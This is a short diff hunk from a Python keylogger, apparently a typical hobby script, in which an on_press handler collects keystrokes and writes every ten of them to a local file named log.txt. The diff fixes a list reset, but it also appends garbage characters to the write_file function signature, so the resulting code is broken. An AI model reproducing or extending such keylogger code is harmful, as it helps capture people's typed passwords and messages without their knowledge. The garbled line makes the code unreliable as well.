@@ -13,9 +13,9 @@ def on_press(key):
     if count >= 10:
         count = 0
         write_file(keys)
-        keys + []
+        keys = []
 
-def write_file(keys):
+def write_file(keys): gshksdbjbu,nlm;lm00
     with open("log.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'","")
